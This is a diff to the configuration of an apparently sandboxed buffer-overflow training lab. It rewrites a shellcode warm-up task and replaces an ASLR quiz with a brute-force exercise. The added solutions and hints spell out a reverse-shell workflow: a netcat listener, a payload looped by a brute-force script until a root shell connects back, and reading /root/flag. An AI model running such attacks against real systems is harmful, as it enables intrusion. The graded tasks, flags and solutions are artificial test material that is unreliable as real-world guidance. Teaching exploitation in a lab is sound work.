@@ -10,7 +10,8 @@
     "Understand how a stack buffer overflow overwrites the return address.",
     "Build a payload (NOP sled + shellcode + return address) and exploit a remote service.",
     "Obtain a root reverse shell on a vulnerable server.",
-    "Explain how ASLR mitigates buffer-overflow attacks."
+    "Build a single size-independent payload when the buffer layout is unknown.",
+    "Defeat 32-bit ASLR by brute force and explain why the same attack is impractical on 64-bit."
   ],
   "state": "UNRELEASED",
   "show_stepper_bar": true,
@@ -21,7 +22,7 @@
       "order": 0,
       "estimated_duration": 0,
       "minimal_possible_solve_time": null,
-      "content": "# Please read carefully\n\n* This lab is for **educational purposes only**. The techniques must only be used inside this training sandbox.\n* Each level builds on the previous one. Do not skip ahead.\n* Revealing a solution or taking hints reduces your score.\n\n# Scenario\n\nYou are a penetration tester. On the target network there is a server (`10.1.26.9`) exposing two network services that each wrap a program written in C. Both programs contain a classic **stack buffer-overflow** vulnerability and run as **root**. Your mission: exploit them to obtain a **root shell** and read the secret flag on each service.\n\nYou work from the **attacker** machine (`10.1.26.23`), a SEED Ubuntu box equipped with the tools you need (`gcc`, `python3`, `netcat`, `gdb`) and the lab files in `~/shellcode` and `~/attack-code`.\n\n# Topology\n\n| Machine | IP | Role |\n|---|---|---|\n| attacker | `10.1.26.23` | your box (you log in here) |\n| server | `10.1.26.9` | runs the vulnerable services |\n\n| Target | Address | Difficulty |\n|---|---|---|\n| Level 1 | `10.1.26.9:9090` | 32-bit, shows frame pointer **and** buffer address |\n| Level 2 | `10.1.26.9:9091` | 32-bit, shows **only** the buffer address |"
+      "content": "# Please read carefully\n\n* This lab is for **educational purposes only**. The techniques must only be used inside this training sandbox.\n* Each level builds on the previous one. Do not skip ahead.\n* Revealing a solution or taking hints reduces your score.\n\n# Scenario\n\nYou are a penetration tester. On the target network there is a server (`10.1.26.9`) exposing three network services that each wrap a program written in C. All of them contain a classic **stack buffer-overflow** vulnerability and run as **root**. Your mission: exploit them to obtain a **root shell** and read the secret flag on each service, then defeat address randomization.\n\nYou work from the **attacker** machine (`10.1.26.23`), a SEED Ubuntu box equipped with the tools you need (`gcc`, `python3`, `netcat`, `gdb`) and the lab files in `~/shellcode` and `~/attack-code`.\n\nThere are **four graded tasks**, each with its own unique per-sandbox flag: a shellcode warm-up on your own box (Task 1), then Level 1 (Task 2), Level 2 (Task 3) and the ASLR target (Task 4).\n\n# Topology\n\n| Machine | IP | Role |\n|---|---|---|\n| attacker | `10.1.26.23` | your box (you log in here) |\n| server | `10.1.26.9` | runs the vulnerable services |\n\n| Target | Address | Difficulty |\n|---|---|---|\n| Level 1 | `10.1.26.9:9090` | 32-bit, shows frame pointer **and** buffer address (ASLR off) |\n| Level 2 | `10.1.26.9:9091` | 32-bit, shows **only** the buffer address (ASLR off) |\n| Level 3 | `10.1.26.9:9092` | 32-bit, same binary as Level 1 but **ASLR on** |"
     },
     {
       "title": "Get Access",
@@ -34,26 +35,26 @@
       "local_content": "This sandbox has not been tested for use with a local sandbox."
     },
     {
-      "title": "Task 1 - Get familiar with the shellcode",
+      "title": "Task 1 - Make the shellcode run your command",
       "level_type": "TRAINING_LEVEL",
       "order": 2,
       "estimated_duration": 10,
       "minimal_possible_solve_time": null,
-      "answer": "execve",
-      "answer_variable_name": null,
-      "content": "The goal of a code-injection attack is to run **shellcode** - a small piece of machine code that launches a shell - using the privilege of the vulnerable program.\n\nThe shellcode is provided for you in `~/shellcode`. Build and test it:\n\n```\nuser@attacker:~$ cd ~/shellcode\nuser@attacker:~/shellcode$ ./shellcode_32.py   # writes codefile_32\nuser@attacker:~/shellcode$ ./shellcode_64.py   # writes codefile_64\nuser@attacker:~/shellcode$ make                # builds a32.out and a64.out\nuser@attacker:~/shellcode$ ./a32.out           # runs the 32-bit shellcode\nuser@attacker:~/shellcode$ ./a64.out           # runs the 64-bit shellcode\n```\n\nOpen `shellcode_32.py` and read how the shellcode launches `/bin/bash -c` with a command string. Try changing that command string (keep the total length identical by adjusting spaces before the `*` marker), regenerate the code file, and run it again to confirm your command executes.\n\n**Flag:** the shellcode ends by invoking a single system call that replaces the current process image with a shell. Submit the **name of that system call**.",
-      "solution": "The 32-bit shellcode sets `eax = 0x0b` (11) and triggers `int 0x80`; syscall 11 on x86 is `execve`. The flag is `execve`.",
+      "answer": null,
+      "answer_variable_name": "flag_task1",
+      "content": "Shellcode is a small piece of machine code that launches a shell - and you can make it run **any command you want**. This warm-up proves you control what the injected code executes before you weaponise it in Task 2. Everything happens on your own attacker box - no server contact yet.\n\nWork only with the 32-bit generator `shellcode_32.py` in `~/shellcode`:\n\n```\nuser@attacker:~$ cd ~/shellcode\nuser@attacker:~/shellcode$ ./shellcode_32.py && make && ./a32.out\n```\n\n### What to change\nOpen `shellcode_32.py` and find the command-string line - the one that ends with a `*` marker. Change the command it runs to simply:\n\n```\nid\n```\n\nKeep the `*` in the **same column** by padding with spaces: the shellcode turns that `*` into a string terminator, so its position must not move. Leave the hex machine-code bytes and the four `AAAA`/`BBBB`/`CCCC`/`DDDD` slots exactly as they are. Then regenerate and run again:\n\n```\nuser@attacker:~/shellcode$ ./shellcode_32.py && make && ./a32.out\nuid=1000(user) gid=1000(user) groups=1000(user),1001(flag-t1-xxxxxxxxxxxx)\n```\n\n**Flag:** the `id` output lists your groups, and one has an unusual, sandbox-unique name starting with `flag-t1-`. Submit that **group name**.\n\n> That group shows up only when `id` runs **through the shellcode** - `a32.out` is installed across a privilege boundary your own shell lacks. Typing `id` directly in your shell will not reveal it, so the step cannot be skipped.",
+      "solution": "In `shellcode_32.py`, change only the command-string line (the one ending with the `*` marker) so the command is `id`, padding with spaces so the `*` stays in the same column. Then `./shellcode_32.py && make && ./a32.out`. The shellcode runs `/bin/bash -c id` across the setuid boundary, so `id` prints a supplementary group named `flag-t1-...` - that group name is the flag.",
       "solution_penalized": true,
       "hints": [
         {
-          "title": "Where to look",
-          "content": "A shell is started by replacing the running process with a new program. The family of system calls that does this starts with `exec`.",
+          "title": "Where to edit",
+          "content": "Change only the command-string line in `shellcode_32.py` - the one ending with the `*` marker - to `id`. Keep the `*` in the same column by adding/removing spaces; do not touch the hex bytes or the AAAA/BBBB/CCCC/DDDD slots.",
           "hint_penalty": 0.5,
           "order": 0
         },
         {
-          "title": "The exact name",
-          "content": "On Linux, the system call that loads and runs a new program image (used by the shellcode via `int 0x80`, eax=11) is `execve`.",
+          "title": "Run it and read the output",
+          "content": "Regenerate and run: `./shellcode_32.py && make && ./a32.out`. Look at the `groups=...` part of the `id` output; the unusual entry that starts with `flag-t1-` is the flag.",
           "hint_penalty": 1,
           "order": 1
         }
@@ -61,7 +62,7 @@
       "incorrect_answer_limit": 10,
       "attachments": [],
       "max_score": 3,
-      "variant_answers": false,
+      "variant_answers": true,
       "reference_solution": [],
       "mitre_techniques": [],
       "expected_commands": [],
@@ -142,28 +143,34 @@
       "commands_required": false
     },
     {
-      "title": "Task 6 - Address randomization (ASLR)",
+      "title": "Task 4 - Defeat address randomization (ASLR)",
       "level_type": "TRAINING_LEVEL",
       "order": 5,
       "estimated_duration": 10,
       "minimal_possible_solve_time": null,
-      "answer": "2",
-      "answer_variable_name": null,
-      "content": "Your attacks worked because **ASLR (Address Space Layout Randomization)** is disabled on the target. Confirm it: connect to Level 1 several times and watch the leaked buffer address.\n\n```\nuser@attacker:~$ echo hello | nc 10.1.26.9 9090\nuser@attacker:~$ echo hello | nc 10.1.26.9 9090\nuser@attacker:~$ echo hello | nc 10.1.26.9 9090\n```\n\nThe buffer address is **the same every time** - so the fixed return address in your payload always lands. With ASLR enabled, that address would change on each run, and a single hard-coded return address would almost always miss (on 32-bit it can still be brute-forced thanks to the small entropy; on 64-bit it becomes impractical).\n\nASLR is controlled by the kernel parameter `kernel.randomize_va_space`:\n* `0` = off (current state)\n* `1` = partial\n* `2` = full randomization\n\n**Flag:** submit the value of `kernel.randomize_va_space` that enables **full** address-space randomization.",
-      "solution": "`sudo sysctl -w kernel.randomize_va_space=2` enables full ASLR. The flag is `2`. With full randomization the stack base changes every execution, so a hard-coded return address no longer reliably points into the NOP sled.",
+      "answer": null,
+      "answer_variable_name": "flag_level3",
+      "content": "The last target runs on **`10.1.26.9:9092`**. It is the **same 32-bit binary as Level 1**, but this container has **ASLR (Address Space Layout Randomization) enabled** (Levels 1 and 2 had it off). Connect a couple of times and watch the leaked buffer address:\n\n```\nuser@attacker:~$ echo hello | nc 10.1.26.9 9092\nBuffer's address inside bof():     0xff8a24c0\nuser@attacker:~$ echo hello | nc 10.1.26.9 9092\nBuffer's address inside bof():     0xffd1e4c0\n```\n\nIt is **different every time**, so your fixed return address from Task 2 usually misses. But on 32-bit the stack has only **19 bits** of entropy (2^19 = 524,288 possibilities) - small enough to defeat by **brute force**: fire the same payload until one run lines up.\n\n### Brute force it\nKeep the **exact `badfile` from Task 2** - do not recompute it. Start your listener, then loop the payload:\n\n```\nuser@attacker:~$ nc -lnv 4444                       # terminal 1: listener\nuser@attacker:~/attack-code$ ./brute-force.sh       # terminal 2: loops badfile at :9092\n```\n\nWithin a few minutes a run aligns, the root reverse shell connects back, and you can read the flag:\n\n```\nroot@...:/# cat /root/flag\n```\n\n**Flag:** the contents of `/root/flag` on the Level 3 target.",
+      "solution": "The Level 3 binary is identical to Level 1 but runs with ASLR on, so the stack address randomizes on every connection and the fixed Task-2 return address usually points outside the NOP sled. Do not recompute the payload: keep the same `badfile` and fire it repeatedly with `~/attack-code/brute-force.sh` at `10.1.26.9:9092` while `nc -lnv 4444` listens. 32-bit ASLR has only 19 bits of entropy (2^19 = 524,288), small enough to exhaust; within minutes a run lines the return address up with the NOP sled, the root reverse shell connects, and `cat /root/flag` reveals the Level 3 flag.",
       "solution_penalized": true,
       "hints": [
         {
-          "title": "The parameter values",
-          "content": "`kernel.randomize_va_space` takes 0 (off), 1 (partial) or 2 (full). You want full randomization.",
+          "title": "Why your old payload misses",
+          "content": "ASLR is on for Level 3, so the leaked buffer address changes on every connection. Your fixed Task-2 return address now usually points outside the NOP sled, so most runs crash instead of executing your shellcode.",
           "hint_penalty": 0.5,
           "order": 0
+        },
+        {
+          "title": "Brute-forcing it",
+          "content": "Reuse the exact `badfile` from Task 2 - do not recompute it. Start `nc -lnv 4444`, then run `~/attack-code/brute-force.sh`, which fires the payload in a loop at :9092. With only 2^19 stack bases, within minutes one run lines up, the root reverse shell connects, and you can `cat /root/flag`.",
+          "hint_penalty": 1,
+          "order": 1
         }
       ],
       "incorrect_answer_limit": 10,
       "attachments": [],
       "max_score": 4,
-      "variant_answers": false,
+      "variant_answers": true,
       "reference_solution": [],
       "mitre_techniques": [],
       "expected_commands": [],
